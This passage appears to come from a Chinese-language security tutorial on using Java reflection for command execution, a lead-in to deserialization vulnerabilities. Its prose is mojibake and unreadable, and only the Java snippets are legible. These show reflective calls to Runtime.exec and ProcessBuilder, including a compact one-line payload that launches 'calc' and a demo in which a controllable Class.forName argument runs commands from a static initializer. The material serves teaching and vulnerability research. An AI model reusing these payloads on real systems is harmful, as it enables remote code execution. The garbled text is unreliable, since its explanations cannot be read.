å¯¹è±¡ï¼Œå³è·å–ç±»ä¸­çš„æ–¹æ³•ï¼Œé€šå¸¸è¦å’Œ invoke() æ–¹æ³•ä¸€èµ·ä½¿ç”¨ï¼Œè¿™é‡Œé‡ç‚¹å…³æ³¨ä¸‹å®ƒçš„å„é¡¹å‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°nameæ˜¯æ‰€è¦è·å–æ–¹æ³•çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°parameterTypesæ˜¯æ‰€è·å¾—çš„æ–¹æ³•ä¸­å‚æ•°çš„ç±»å‹ï¼ŒparameterTypes æ˜¯ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œç”¨çš„æ˜¯javaçš„å¯å˜é•¿å‚æ•°çš„å†™æ³•ï¼Œ&lt;?&gt; æ˜¯æ³›å‹çš„è¡¨ç¤ºï¼Œè¿™é‡Œä¸æ¢è®¨ã€‚ å³å‚æ•°ç±»å‹ Class&lt;?&gt;... parameterTypes å…¶å®ç­‰ä»·äº Class&lt;?&gt;[] parameterTypes ã€‚ä¼ é€’çš„å¯¹åº”å‚æ•°æ˜¯æ‰€è·å–æ–¹æ³•çš„å¯¹åº”çš„å‚æ•°ç±»å‹ã€‚æ¯”å¦‚ Runtime ä¸­çš„ exec(String command) å‡½æ•°ï¼Œè·å–å®ƒå°±æ˜¯ Class clazz = Class.forName(\"java.lang.Runtime\"); Method cmd = clazz.getMethod(\"exec\", String.class); Invoke() invoke() æ–¹æ³•ç”¨äºæ‰§è¡Œ getMethod è·å–çš„æ–¹æ³•ï¼Œçœ‹çœ‹å®ƒçš„ç›¸å…³å‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°æ‰€åœ¨çš„ç±»å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯æ‰€æ‰§è¡Œçš„å‡½æ•°çš„å¯¹è±¡å‚æ•°ï¼šä¾æ—§æ‹¿ exec(String command) æ–¹æ³•æ¥è¯´ Runtime run = Runtime.getRuntime();//è·å–Runtimeå¯¹è±¡ Class clazz = Class.forName(\"java.lang.Runtime\"); Method cmd = clazz.getMethod(\"exec\", String.class); cmd.invoke(run, \"calc\");//æ‰§è¡Œå‡½æ•° å¦‚æœæ‰§è¡Œçš„æ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆ invoke çš„ç¬¬ä¸€ä¸ª obj å‚æ•°å°†è¢«å¿½ç•¥ æ¯”å¦‚æˆ‘ä»¬è¦æ‰§è¡Œä¸Šé¢æ‰€è¯´çš„ Runtime ç±»ä¸­çš„é™æ€æ–¹æ³• getRuntime() å»è·å–å¯¹è±¡ Class clazz = Class.forName(\"java.lang.Runtime\"); //è°ƒç”¨é™æ€æ–¹æ³•getRuntime()è·å–Runtimeå¯¹è±¡ Runtime run = (Runtime) clazz.getMethod(\"getRuntime\").invoke(null);//è°ƒç”¨çš„æ˜¯é™æ€æ–¹æ³•ï¼Œinvoke()é‡Œå‚æ•°éšä¾¿å†™ä¸€ä¸ªå°±è¡Œï¼Œä¼šå¿½ç•¥ç¬¬ä¸€ä¸ªå‚æ•° run.exec(\"calc\"); ç­‰ä»·äº Runtime.getRuntime().exec(\"calc\"); åå°„java.lang.Runtime java.lang.Runtimeå› ä¸ºæœ‰ä¸€ä¸ªexecæ–¹æ³•å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼Œæ‰€ä»¥åœ¨å¾ˆå¤šçš„payloadä¸­æˆ‘ä»¬éƒ½èƒ½çœ‹åˆ°åå°„è°ƒç”¨Runtimeç±»æ¥æ‰§è¡Œæœ¬åœ°ç³»ç»Ÿå‘½ä»¤ï¼Œé€šè¿‡å­¦ä¹ å¦‚ä½•åå°„Runtimeç±»ä¹Ÿèƒ½è®©æˆ‘ä»¬ç†è§£åå°„çš„ä¸€äº›åŸºç¡€ç”¨æ³•ã€‚ ä¸ä½¿ç”¨åå°„æ‰§è¡Œæœ¬åœ°å‘½ä»¤ä»£ç ç‰‡æ®µï¼š // è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"whoami\").getInputStream(), \"UTF-8\")); å¦‚ä¸Šå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€è¡Œä»£ç å®Œæˆæœ¬åœ°å‘½ä»¤æ‰§è¡Œæ“ä½œï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨åå°„å°±ä¼šæ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä»¬ä¸å¾—ä¸éœ€è¦é—´æ¥æ€§çš„è°ƒç”¨Runtimeçš„execæ–¹æ³•ã€‚ åå°„Runtimeæ‰§è¡Œæœ¬åœ°å‘½ä»¤ä»£ç ç‰‡æ®µï¼š // è·å–Runtimeç±»å¯¹è±¡ Class runtimeClass1 = Class.forName(\"java.lang.Runtime\"); // è·å–æ„é€ æ–¹æ³• Constructor constructor = runtimeClass1.getDeclaredConstructor(); constructor.setAccessible(true); // åˆ›å»ºRuntimeç±»ç¤ºä¾‹ï¼Œç­‰ä»·äº Runtime rt = new Runtime(); Object runtimeInstance = constructor.newInstance(); // è·å–Runtimeçš„exec(String cmd)æ–¹æ³• Method runtimeMethod = runtimeClass1.getMethod(\"exec\", String.class); // è°ƒç”¨execæ–¹æ³•ï¼Œç­‰ä»·äº rt.exec(cmd); Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd); // è·å–å‘½ä»¤æ‰§è¡Œç»“æœ InputStream in = process.getInputStream(); // è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ System.out.println(org.apache.commons.io.IOUtils.toString(in, \"UTF-8\")); åå°„è°ƒç”¨Runtimeå®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š åå°„è·å–Runtimeç±»å¯¹è±¡(Class.forName(\"java.lang.Runtime\"))ã€‚ ä½¿ç”¨Runtimeç±»çš„Classå¯¹è±¡è·å–Runtimeç±»çš„æ— å‚æ•°æ„é€ æ–¹æ³•(getDeclaredConstructor())ï¼Œå› ä¸ºRuntimeçš„æ„é€ æ–¹æ³•æ˜¯privateçš„æˆ‘ä»¬æ— æ³•ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡åå°„å»ä¿®æ”¹æ–¹æ³•çš„è®¿é—®æƒé™(constructor.setAccessible(true))ã€‚ è·å–Runtimeç±»çš„exec(String)æ–¹æ³•(runtimeClass1.getMethod(\"exec\", String.class);)ã€‚ è°ƒç”¨exec(String)æ–¹æ³•(runtimeMethod.invoke(runtimeInstance, cmd))ã€‚ ä¸Šé¢çš„ä»£ç æ¯ä¸€æ­¥éƒ½å†™äº†éå¸¸æ¸…æ™°çš„æ³¨é‡Šï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†è¿›ä¸€æ­¥æ·±å…¥çš„äº†è§£ä¸‹æ¯ä¸€æ­¥å…·ä½“å«ä¹‰ã€‚ Javaåå°„åˆ°å‘½ä»¤æ‰§è¡Œ å­¦ä¹ avaåå°„æœºåˆ¶ï¼Œå…¶å®æˆ‘ä»¬æ›´å…³å¿ƒå¦‚ä½•åˆ©ç”¨Javaåå°„å®ç°å‘½ä»¤æ‰§è¡Œã€‚ä¸‹é¢æ˜¯Javaåå°„å‘½ä»¤æ‰§è¡Œçš„å‡ ç§æƒ…å†µ Demo 1 package åå°„; public class TrainPrint { { System.out.printf(\"Empty block initial %s \", this.getClass()); } static { System.out.printf(\"Static initial %s \", TrainPrint.class); try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"calc\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } public TrainPrint() { System.out.printf(\"Initial %s \", this.getClass()); } } package åå°„; import åå°„.TrainPrint; public class exp { public static void main(String[] args) throws Exception { ref(\"åå°„.TrainPrint\"); } //å‡è®¾name å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬ä½¿ç”¨runtimeæ¥å¼¹è®¡ç®—å™¨ï¼š public static void ref(String name) throws Exception { Class.forName(name); } } å¯ä»¥çœ‹åˆ°åœ¨TrainPrintç±»ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªå®ä¾‹åŒ–å‡½æ•°å—ã€é™æ€åˆå§‹åŒ–å—ä»¥åŠæ„é€ å‡½æ•°ï¼›åœ¨expç±»ä¸­ï¼Œåˆ™æ˜¯å®šä¹‰äº†ä¸€ä¸ªmainå‡½æ•°æ¥è°ƒç”¨refå‡½æ•°ã€‚ åœ¨refå‡½æ•°ä¸­ï¼Œå¯¹ä¼ å…¥çš„nameå‚æ•°ï¼Œä¼šç”¨forNameå‡½æ•°å»åŠ è½½å¹¶åˆå§‹åŒ–nameå¯¹åº”çš„ç±»ï¼Œè€Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯â€œåå°„.TrainPrintâ€ç±»ï¼Œè€ŒåŠ è½½è¯¥ç±»ä¹‹åï¼Œå›å»è°ƒç”¨ç±»ä¸­å¯¹åº”çš„é™æ€åˆå§‹åŒ–å—å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°æ‰§è¡Œexec(â€œcalcâ€)ä»£ç ï¼Œæœ€ç»ˆå¼¹å‡ºè®¡ç®—å™¨ã€‚ è€Œè¿™é‡Œå‘¢ï¼Œå¦‚æœæˆ‘ä»¬å¯¹nameå¯æ§ï¼Œé‚£å°±å¯ä»¥æ„é€ æ¶æ„ç±»è¿›è¡Œæ”»å‡»äº† Demo 2 ä¸‹é¢æ˜¯ä¸¤ç§é€šè¿‡åå°„java.lang.Runtimeæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ ç”±äºjava.lang.Runtimeç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ä½¿ç”¨ newInstance() åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚é‚£ä¸ºä»€ä¹ˆè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ä¼šæ˜¯ç§æœ‰çš„å‘¢ï¼Ÿ è¿™æ¶‰åŠåˆ°ä¸€ä¸ªâ€œå•ä¾‹æ¨¡å¼â€çš„æ¦‚å¿µï¼š å•ä¾‹æ¨¡å¼ï¼ˆSingletonï¼‰çš„ç›®çš„æ˜¯ä¸ºäº†ä¿è¯åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼ŒæŸä¸ªç±»æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå®ä¾‹ã€‚å› ä¸ºè¿™ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå› æ­¤ï¼Œè‡ªç„¶ä¸èƒ½è®©è°ƒç”¨æ–¹ä½¿ç”¨new Xyz()æ¥åˆ›å»ºå®ä¾‹äº†ã€‚æ‰€ä»¥ï¼Œå•ä¾‹çš„æ„é€ æ–¹æ³•å¿…é¡»æ˜¯privateï¼Œè¿™æ ·å°±é˜²æ­¢äº†è°ƒç”¨æ–¹è‡ªå·±åˆ›å»ºå®ä¾‹ï¼Œä½†æ˜¯åœ¨ç±»çš„å†…éƒ¨ï¼Œæ˜¯å¯ä»¥ç”¨ä¸€ä¸ªé™æ€å­—æ®µæ¥å¼•ç”¨å”¯ä¸€åˆ›å»ºçš„å®ä¾‹çš„ã€‚ä¸¾ä¸ªä¾‹å­ï¼šæˆ‘ä»¬åœ¨é“¾æ¥æ•°æ®åº“æ—¶åªæœ‰æœ€å¼€å§‹é“¾æ¥ä¸€æ¬¡ï¼Œè€Œä¸æ˜¯ç”¨ä¸€æ¬¡é“¾æ¥ä¸€æ¬¡ï¼Œå¦‚æœè¿™æ ·çš„è¯ï¼Œèµ„æºæ¶ˆè€—å¤ªå¤§äº†ã€‚å› æ­¤å¯ä»¥å°†ç±»çš„æ„é€ å‡½æ•°è®¾ä¸ºç§æœ‰ï¼Œå†é€šè¿‡é™æ€æ–¹æ³•æ¥è·å–ã€‚ ç”±äºjava.lang.Runtimeä½¿ç”¨äº†å•ä¾‹æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Runtime.getRuntime()æ¥è·å–Runtimeå¯¹è±¡ã€‚ æœ‰ä¸¤ç§æ–¹æ³•è¿›è¡Œåå°„å‘½ä»¤æ‰§è¡Œï¼š getMethod package RCE; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class clazz; clazz = Class.forName(\"java.lang.Runtime\"); Method execMethod = clazz.getMethod(\"exec\", String.class); Method getRuntimeMethod = clazz.getMethod(\"getRuntime\"); Object runtime = getRuntimeMethod.invoke(clazz); execMethod.invoke(runtime, \"calc.exe\"); } } è¿™é‡Œç”±äºæˆ‘ä»¬æ— æ³•ç›´æ¥å®ä¾‹åŒ–Runtimeç±»ï¼Œå› æ­¤åªèƒ½é Javaåå°„æœºåˆ¶ï¼š é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªClasså¯¹è±¡clazzï¼Œç„¶åé€šè¿‡forNameæ–¹æ³•ï¼Œè·å–åˆ°äº†Runtimeç±»çš„Classå¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯èƒ½å¾—åˆ°Runtimeç±»ä¸­çš„æ•°æ®åŠæ–¹æ³•ï¼‰ã€‚éšååˆ©ç”¨getMethodæ–¹æ³•è°ƒç”¨äº†clazzï¼ˆå³Runtimeç±»ï¼‰ä¸­çš„execæ–¹æ³•ï¼Œä¸ºåç»­å‘½ä»¤æ‰§è¡Œåšå‡†å¤‡ã€‚ ç„¶ååˆé€šè¿‡getMethodè·å–åˆ°Runtimeç±»ä¸­çš„getRuntimeæ–¹æ³•ï¼Œæ¥ç€é€šè¿‡invokeè¿›è¡Œè°ƒç”¨è¯¥æ–¹æ³•æ‰§è¡Œï¼š ä¹Ÿå°±æ˜¯æ‰§è¡ŒRuntime.getRuntimeæˆåŠŸè·å–åˆ°Runtimeç±»çš„å¯¹è±¡ï¼Œå¹¶èµ‹å€¼ç»™runtimeå®ä¾‹ã€‚ æœ€ç»ˆç”¨invokeæ–¹æ³•è°ƒç”¨äº†runtimeå®ä¾‹çš„execæ–¹æ³•ï¼Œå¹¶ä¼ å…¥ç›¸åº”å‚æ•°ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚ getDeclaredConstructor package RCE; import java.io.InputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class runtimeClass1 = Class.forName(\"java.lang.Runtime\"); Constructor constructor = runtimeClass1.getDeclaredConstructor(); constructor.setAccessible(true); Object runtime = constructor.newInstance(); Method runtimeMethod = runtimeClass1.getMethod(\"exec\", String.class); runtimeMethod.invoke(runtime, \"calc\"); } } é¦–å…ˆé€šè¿‡forNameè·å–Runtimeçš„Classç±»å¯¹è±¡ Classå¯¹è±¡æä¾›äº†å…³äºç±»æˆ–æ¥å£çš„ç»“æ„å’Œè¡Œä¸ºçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„åç§°ã€çˆ¶ç±»ã€å®ç°çš„æ¥å£ã€å­—æ®µã€æ–¹æ³•ç­‰ã€‚ éœ€è¦æ³¨æ„ï¼Œè¿™é‡Œçš„classå¯¹è±¡å¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨æŸç§æ–¹æ³•ï¼Œè¿˜éœ€è¦åˆ©ç”¨åå°„æœºåˆ¶æ‰å¯ ä¹‹ååˆ©ç”¨getDeclaredConstructorå‡½æ•°è·å–åˆ°äº†Runtimeç±»ä¸­çš„ç§æœ‰æ„é€ å‡½æ•°ï¼Œæ¥ç€è®¾ç½®setAccessible(true)ä½¿å¾—æˆ‘ä»¬å¯ä»¥è°ƒç”¨å…¶ç§æœ‰æ„é€ å‡½æ•°ã€‚ æ¥ç€åˆ©ç”¨constructorçš„newInstanceå°±å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªRuntimeç±»å¯¹è±¡äº†ï¼Œä¹‹åé€šè¿‡Classå¯¹è±¡è°ƒç”¨getMethodæ–¹æ³•è·å–åˆ°Runtimeç±»çš„execæ–¹æ³•ã€‚ æœ€ååˆ©ç”¨invokeæ‰§è¡Œï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚ æ³¨æ„ï¼šè¿™é‡Œæˆ‘ç”¨çš„æ˜¯jdk1.8ï¼Œå¦‚æœæ˜¯jdk9ä»¥ä¸Šï¼Œå¯¹äºè¿™ç§åå°„æœºåˆ¶ä¼šçˆ†å‡ºå¦‚ä¸‹é”™è¯¯ï¼š Unable to make private java.lang.Runtime() accessible: module java.base does not \"opens java.lang\" to unnamed module... è§£å†³åŠæ³•å¯å‚è€ƒï¼š[Getting java.lang.reflect.InaccessibleObjectException when migrated to Java 17](https://community.temporal.io/t/getting-java-lang-reflect-inaccessibleobjectexception-when-migrated-to-java-17/6168) ä½†è¿™é‡Œæˆ‘å°±æ¢äº†ä¸ªä½ç‰ˆæœ¬ï¼Œæ‡’å¾—è§£å†³äº† getConstructorå’ŒgetDeclaredConstructor è¿™ä¸¤ä¸ªæ–¹æ³•å‡ç”¨äºè·å–ç±»çš„æ„é€ æ–¹æ³•ï¼Œåè€…å¯ä»¥è·å–ç§æœ‰çš„æ„é€ æ–¹æ³• å‰é¢åˆ©ç”¨ Class ä¸­çš„ newInstance æ–¹æ³•è·å–ä¸€ä¸ªç±»å¯¹è±¡åªèƒ½æ˜¯å¯¹åº”æ— å‚çš„æ„é€ å‡½æ•°æ¥å®ä¾‹åŒ–ç±»ï¼Œè€Œåˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°å¯ä»¥è°ƒç”¨ç±»çš„æœ‰å‚æ„é€ å‡½æ•°æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚ è¿™é‡Œä»¥ getConstructor ä¸ºä¾‹ï¼ŒgetDeclaredConstructor ç”¨æ³•ç›¸åŒåªæ˜¯åç»­è¦åŠ ä¸ª setAccessible(true) è¯¥æ–¹æ³•çš„å‚æ•°æ˜¯è·å–åˆ°çš„æ„é€ æ–¹æ³•ä¸­å¯¹åº”å‚æ•°çš„æ•°æ®ç±»å‹ï¼Œè¯¥æ–¹æ³•è¿”å›çš„ Constructor å¯¹è±¡ä¸­æœ‰ä¸ª newInstance æ–¹æ³•ï¼Œçœ‹çœ‹è¿™ä¸ª newInstance æ–¹æ³•çš„å‚æ•° newInstance æ–¹æ³•çš„å‚æ•°æ˜¯è°ƒç”¨çš„æ„é€ æ–¹æ³•å¯¹åº”çš„å‚æ•°ã€‚æ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨ ProcessBuilder ç±»æ¥æ‰§è¡Œå‘½ä»¤ new ProcessBuilder(\"calc\").start(); æ³¨æ„è¿™é‡Œç”¨åˆ°çš„ ProcessBuilder é‡è½½çš„æ„é€ æ–¹æ³• String... command` ç­‰ä»·äº `String[] command ä½¿ç”¨åå°„æ„é€  Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(new String[][] {{\"calc\"}})).start(); ç®€å•è§£é‡Šä¸‹è¿™ä¸¤ä¸ªå‚æ•° String[].class æ˜¯ ProcessBuilder ç±»æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ï¼ŒnewInstance å‚æ•°ä¹Ÿæ˜¯å¯å˜é•¿å‚æ•°ï¼Œç­‰ä»·äº Object[] initargs ï¼Œå³å¥—ä¸¤å±‚æ•°ç»„ new String[][] {{\"calc\"}} ä¸Šè¿°ç”¨åˆ°äº†å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå°†ä¸Šè¿°payloadæ”¹æ”¹ï¼Œç”¨å®Œå…¨åå°„çš„æ–¹æ³• Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); Constructor m = clazz.getConstructor(String[].class); clazz.getMethod(\"start\").invoke(m.newInstance(new String[][] {{\"calc\"}})); å†™æˆä¸€è¡Œ Class.forName(\"java.lang.ProcessBuilder\").getMethod(\"start\").invoke(Class.forName(\"java.lang.ProcessBuilder\").getConstructor(String[].class).newInstance(new String[][] {{\"calc\"}})); runtimeClass1.getDeclaredConstructorå’ŒruntimeClass1.getConstructoréƒ½å¯ä»¥è·å–åˆ°ç±»æ„é€ æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºåè€…æ— æ³•è·å–åˆ°ç§æœ‰æ–¹æ³•ï¼Œæ‰€ä»¥ä¸€èˆ¬åœ¨è·å–æŸä¸ªç±»çš„æ„é€ æ–¹æ³•æ—¶å€™æˆ‘ä»¬ä¼šä½¿ç”¨å‰è€…å»è·å–æ„é€ æ–¹æ³•ã€‚å¦‚æœæ„é€ æ–¹æ³•æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°çš„æƒ…å†µä¸‹æˆ‘ä»¬åº”è¯¥åœ¨è·å–æ„é€ æ–¹æ³•æ—¶å€™ä¼ å…¥å¯¹åº”çš„å‚æ•°ç±»å‹æ•°ç»„ï¼Œå¦‚ï¼šclazz.getDeclaredConstructor(String.class, String.class)ã€‚ å¦‚æœæˆ‘ä»¬æƒ³è·å–ç±»çš„æ‰€æœ‰æ„é€ æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼šclazz.getDeclaredConstructorsæ¥è·å–ä¸€ä¸ªConstructoræ•°ç»„ã€‚ è·å–åˆ°Constructorä»¥åæˆ‘ä»¬å¯ä»¥é€šè¿‡constructor.newInstance()æ¥åˆ›å»ºç±»å®ä¾‹,åŒç†å¦‚æœæœ‰å‚æ•°çš„æƒ…å†µä¸‹æˆ‘ä»¬åº”è¯¥ä¼ å…¥å¯¹åº”çš„å‚æ•°å€¼ï¼Œå¦‚:constructor.newInstance(\"admin\", \"123456\")ã€‚å½“æˆ‘ä»¬æ²¡æœ‰è®¿é—®æ„é€ æ–¹æ³•æƒé™æ—¶æˆ‘ä»¬åº”è¯¥è°ƒç”¨constructor.setAccessible(true)ä¿®æ”¹è®¿é—®æƒé™å°±å¯ä»¥æˆåŠŸçš„åˆ›å»ºå‡ºç±»å®ä¾‹äº†ã€‚ åå°„è°ƒç”¨ç±»æ–¹æ³• Classå¯¹è±¡æä¾›äº†ä¸€ä¸ªè·å–æŸä¸ªç±»çš„æ‰€æœ‰çš„æˆå‘˜æ–¹æ³•çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°ç±»å‹æ¥è·å–æŒ‡å®šæˆå‘˜æ–¹æ³•ã€‚ è·å–å½“å‰ç±»æ‰€æœ‰çš„æˆå‘˜æ–¹æ³•ï¼š Method[] methods = clazz.getDeclaredMethods() è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜æ–¹æ³•ï¼š Method method = clazz.getDeclaredMethod(\"æ–¹æ³•å\"); Method method = clazz.getDeclaredMethod(\"æ–¹æ³•å\", å‚æ•°ç±»å‹å¦‚String.classï¼Œå¤šä¸ªå‚æ•°ç”¨\",\"å·éš”å¼€); getMethodå’ŒgetDeclaredMethodéƒ½èƒ½å¤Ÿè·å–åˆ°ç±»æˆå‘˜æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºgetMethodåªèƒ½è·å–åˆ°å½“å‰ç±»å’Œçˆ¶ç±»çš„æ‰€æœ‰æœ‰æƒé™çš„æ–¹æ³•(å¦‚ï¼špublic)ï¼Œè€ŒgetDeclaredMethodèƒ½è·å–åˆ°å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜æ–¹æ³•(ä¸åŒ…å«çˆ¶ç±»)ã€‚ åå°„è°ƒç”¨æ–¹æ³• è·å–åˆ°java.lang.reflect.Methodå¯¹è±¡ä»¥åæˆ‘ä»¬å¯ä»¥é€šè¿‡Methodçš„invokeæ–¹æ³•æ¥è°ƒç”¨ç±»æ–¹æ³•ã€‚ è°ƒç”¨ç±»æ–¹æ³•ä»£ç ç‰‡æ®µï¼š method.invoke(æ–¹æ³•å®ä¾‹å¯¹è±¡, æ–¹æ³•å‚æ•°å€¼ï¼Œå¤šä¸ªå‚æ•°å€¼ç”¨\",\"éš”å¼€); method.invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ç±»å®ä¾‹å¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯staticæ–¹æ³•é‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å€¼å¯ä»¥ä¼ nullï¼Œå› ä¸ºåœ¨javaä¸­è°ƒç”¨é™æ€æ–¹æ³•æ˜¯ä¸éœ€è¦æœ‰ç±»å®ä¾‹çš„ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥ç±»å.æ–¹æ³•å(å‚æ•°)çš„æ–¹å¼è°ƒç”¨ã€‚ method.invokeçš„ç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœå½“å‰è°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä¸ä¼ ï¼Œå¦‚æœæœ‰å‚æ•°é‚£ä¹ˆå°±å¿…é¡»ä¸¥æ ¼çš„ä¾æ¬¡ä¼ å…¥å¯¹åº”çš„å‚æ•°ç±»å‹ã€‚ åå°„è°ƒç”¨æˆå‘˜å˜é‡ Javaåå°„ä¸ä½†å¯ä»¥è·å–ç±»æ‰€æœ‰çš„æˆå‘˜å˜é‡åç§°ï¼Œè¿˜å¯ä»¥æ— è§†æƒé™ä¿®é¥°ç¬¦å®ç°ä¿®æ”¹å¯¹åº”çš„å€¼ã€‚ è·å–å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡ï¼š Field fields = clazz.getDeclaredFields(); è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼š Field field = clazz.getDeclaredField(\"å˜é‡å\"); getFieldå’ŒgetDeclaredFieldçš„åŒºåˆ«åŒgetMethodå’ŒgetDeclaredMethodã€‚ è·å–æˆå‘˜å˜é‡å€¼ï¼š Object obj = field.get(ç±»å®ä¾‹å¯¹è±¡); ä¿®æ”¹æˆå‘˜å˜é‡å€¼ï¼š field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); åŒç†ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹çš„æˆå‘˜å˜é‡æƒé™æ—¶å¯ä»¥ä½¿ç”¨: field.setAccessible(true)çš„æ–¹å¼ä¿®æ”¹ä¸ºè®¿é—®æˆå‘˜å˜é‡è®¿é—®æƒé™ã€‚ å¦‚æœæˆ‘ä»¬éœ€è¦ä¿®æ”¹è¢«finalå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å…ˆä¿®æ”¹æ–¹æ³• // åå°„è·å–Fieldç±»çš„modifiers Field modifiers = field.getClass().getDeclaredField(\"modifiers\"); // è®¾ç½®modifiersä¿®æ”¹æƒé™ modifiers.setAccessible(true); // ä¿®æ”¹æˆå‘˜å˜é‡çš„Fieldå¯¹è±¡çš„modifierså€¼ modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL); // ä¿®æ”¹æˆå‘˜å˜é‡å€¼ field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); 0x02 ä»€ä¹ˆæ˜¯Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ– åœ¨ç¼–ç¨‹è¯­è¨€çš„ä¸–ç•Œå½“ä¸­,å¸¸å¸¸æœ‰è¿™æ ·çš„éœ€æ±‚,æˆ‘ä»¬éœ€è¦å°†æœ¬åœ°å·²ç»å®ä¾‹åŒ–çš„æŸä¸ªå¯¹è±¡,é€šè¿‡ç½‘ç»œä¼ é€’åˆ°å…¶ä»–æœºå™¨å½“ä¸­.ä¸ºäº†æ»¡è¶³è¿™ç§éœ€æ±‚,å°±æœ‰äº†æ‰€è°“çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– Java: 1. åºåˆ—åŒ–ï¼šå°†Javaå¯¹è±¡å‹ç¼©æˆå­—èŠ‚åºåˆ—æˆ–å­—èŠ‚æµçš„å½¢å¼ 2. ååºåˆ—åŒ–ï¼šå°†å­—èŠ‚åºåˆ—æˆ–å­—èŠ‚æµè½¬åŒ–æˆJavaå¯¹è±¡ å¯¹è±¡çš„åºåˆ—åŒ–ä¸»è¦æœ‰ä¸¤ç§ç”¨é€”ï¼š æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼›ï¼ˆæŒä¹…åŒ–å¯¹è±¡ï¼‰ åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ï¼ˆç½‘ç»œä¼ è¾“å¯¹è±¡ï¼‰ 0x03 æ¼æ´æˆå›  